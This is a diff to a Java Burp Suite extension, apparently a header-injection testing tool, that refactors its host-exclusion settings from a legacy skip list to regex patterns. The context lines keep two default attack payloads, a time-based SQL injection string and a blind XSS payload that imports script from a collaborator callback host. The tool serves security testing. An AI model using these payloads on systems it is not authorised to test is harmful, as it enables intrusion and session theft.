@@ -45,7 +45,6 @@ public class BurpHeaderBanger implements BurpExtension {
     private List<String> sensitiveHeaders = new ArrayList<>();
     private String sqliPayload = "1'XOR(if(now()=sysdate(),sleep(17),0))OR'Z";
     private String bxssPayload = "\"><img/src/onerror=import('//{{collaborator}}')>"; // Use {{collaborator}} placeholder
-    private List<String> skipHosts = new ArrayList<>(); // Legacy support - to be removed after migration
     private List<Exclusion> exclusions = new ArrayList<>();
     private List<String> injectedHeaders = new ArrayList<>();
     private List<String> extraHeaders = new ArrayList<>();
@@ -66,7 +65,6 @@ public class BurpHeaderBanger implements BurpExtension {
             "Referer",
             "X-Forwarded-For",
             "X-Real-IP",
-            "Forwarded",
             "True-Client-IP",
             "X-Client-IP",
             "X-Cluster-Client-IP",
@@ -77,17 +75,13 @@ public class BurpHeaderBanger implements BurpExtension {
     
     private static final List<String> DEFAULT_SENSITIVE_HEADERS = Arrays.asList(
             "X-Host", "X-Forwarded-Host", "X-Forwarded-Server",
-            "X-HTTP-Host-Override", "Forwarded", "Origin"
-    );
-    
-    private static final List<String> DEFAULT_SKIP_HOSTS = Arrays.asList(
-            "player.vimeo.com", "example3.com"
+            "X-HTTP-Host-Override", "Origin"
     );
     
     // Default exclusions (regex patterns)
     private static final List<Exclusion> DEFAULT_EXCLUSIONS = Arrays.asList(
-            new Exclusion(true, "player\\.vimeo\\.com", true),
-            new Exclusion(true, "example3\\.com", true)
+            new Exclusion(true, "player\\.vimeo\\.com"),
+            new Exclusion(true, "example3\\.com")
     );
 
     @Override
@@ -260,14 +254,6 @@ public class BurpHeaderBanger implements BurpExtension {
             sensitiveHeaders = new ArrayList<>(DEFAULT_SENSITIVE_HEADERS);
         }
         
-        // Load skip hosts (legacy support)
-        String skipHostsJson = persistedObject.getString("skipHosts");
-        if (skipHostsJson != null && !skipHostsJson.isEmpty()) {
-            skipHosts = new ArrayList<>(Arrays.asList(skipHostsJson.split(",")));
-        } else {
-            skipHosts = new ArrayList<>(DEFAULT_SKIP_HOSTS);
-        }
-        
         // Load exclusions
         String exclusionsJson = persistedObject.getString("exclusions");
         api.logging().logToOutput("DEBUG loadSettings: Loading exclusions from persistence");
@@ -282,15 +268,19 @@ public class BurpHeaderBanger implements BurpExtension {
             }
             api.logging().logToOutput("DEBUG loadSettings: Loaded " + exclusions.size() + " exclusions from persistence");
         } else {
-            // Migrate from old skipHosts or use defaults
-            exclusions = new ArrayList<>();
-            if (!skipHosts.isEmpty()) {
+            // Check for legacy skipHosts migration
+            String skipHostsJson = persistedObject.getString("skipHosts");
+            if (skipHostsJson != null && !skipHostsJson.isEmpty()) {
                 // Migrate from old skipHosts format to regex patterns
-                for (String host : skipHosts) {
+                exclusions = new ArrayList<>();
+                List<String> legacySkipHosts = Arrays.asList(skipHostsJson.split(","));
+                for (String host : legacySkipHosts) {
                     String regexPattern = host.replace(".", "\\.");
-                    exclusions.add(new Exclusion(true, regexPattern, true));
+                    exclusions.add(new Exclusion(true, regexPattern));
                 }
                 api.logging().logToOutput("DEBUG loadSettings: Migrated " + exclusions.size() + " exclusions from skipHosts");
+                // Clear skipHosts after migration
+                persistedObject.setString("skipHosts", "");
             } else {
                 // Use default exclusions
                 exclusions = new ArrayList<>(DEFAULT_EXCLUSIONS);
@@ -349,8 +339,8 @@ public class BurpHeaderBanger implements BurpExtension {
         // Save sensitive headers
         persistedObject.setString("sensitiveHeaders", String.join(",", sensitiveHeaders));
         
-        // Save skip hosts (legacy support)
-        persistedObject.setString("skipHosts", String.join(",", skipHosts));
+        // Save skip hosts (legacy support - keep empty after migration)
+        persistedObject.setString("skipHosts", "");
         
         // Save exclusions
         List<String> exclusionJsonList = new ArrayList<>();
@@ -406,8 +396,7 @@ public class BurpHeaderBanger implements BurpExtension {
     public String getBxssPayload() { return bxssPayload; }
     public void setBxssPayload(String bxssPayload) { this.bxssPayload = bxssPayload; }
 
-    public List<String> getSkipHosts() { return skipHosts; }
-    public void setSkipHosts(List<String> skipHosts) { this.skipHosts = skipHosts; }
+
 
     public List<Exclusion> getExclusions() { return exclusions; }
     public void setExclusions(List<Exclusion> exclusions) { this.exclusions = exclusions; }
@@ -449,28 +438,26 @@ public class BurpHeaderBanger implements BurpExtension {
         return false;
     }
     
-    public void addExclusion(String pattern, boolean isRegex) {
+    public void addExclusion(String pattern) {
         // Prevent duplicates
         for (Exclusion exclusion : exclusions) {
-            if (exclusion.getPattern().equals(pattern) && exclusion.isRegex() == isRegex) {
-                api.logging().logToOutput("Exclusion already exists: " + pattern + " (isRegex=" + isRegex + ")");
+            if (exclusion.getPattern().equals(pattern)) {
+                api.logging().logToOutput("Exclusion already exists: " + pattern);
                 return;
             }
         }
         
         // Test the pattern compilation first
         try {
-            if (isRegex) {
-                Pattern.compile(pattern);
-            }
+            Pattern.compile(pattern);
         } catch (Exception e) {
             api.logging().logToError("[ERROR] Invalid regex pattern: " + pattern + " - " + e.getMessage());
             return;
         }
         
-        Exclusion newExclusion = new Exclusion(true, pattern, isRegex);
+        Exclusion newExclusion = new Exclusion(true, pattern);
         exclusions.add(newExclusion);
-        api.logging().logToOutput("Added exclusion: " + pattern + " (regex=" + isRegex + "). Total exclusions: " + exclusions.size());
+        api.logging().logToOutput("Added exclusion: " + pattern + ". Total exclusions: " + exclusions.size());
         
         // Save settings immediately after adding
         api.logging().logToOutput("Saving exclusion settings to persistence...");
@@ -499,14 +486,14 @@ public class BurpHeaderBanger implements BurpExtension {
         // Create a simple regex pattern that matches the host anywhere in the URL
         // Escape dots in hostname for regex
         String regexPattern = host.replace(".", "\\.");
-        addExclusion(regexPattern, true);
+        addExclusion(regexPattern);
     }
     
     public void addUrlExclusion(String url) {
         // Create a regex pattern that matches the exact URL
         // Escape special regex characters in URL
         String regexPattern = url.replace(".", "\\.").replace("?", "\\?").replace("*", "\\*").replace("+", "\\+").replace("[", "\\[").replace("]", "\\]").replace("(", "\\(").replace(")", "\\)").replace("{", "\\{").replace("}", "\\}").replace("^", "\\^").replace("$", "\\$").replace("|", "\\|");
-        addExclusion(regexPattern, true);
+        addExclusion(regexPattern);
     }
 
     public void extractSqliSleepTime() {
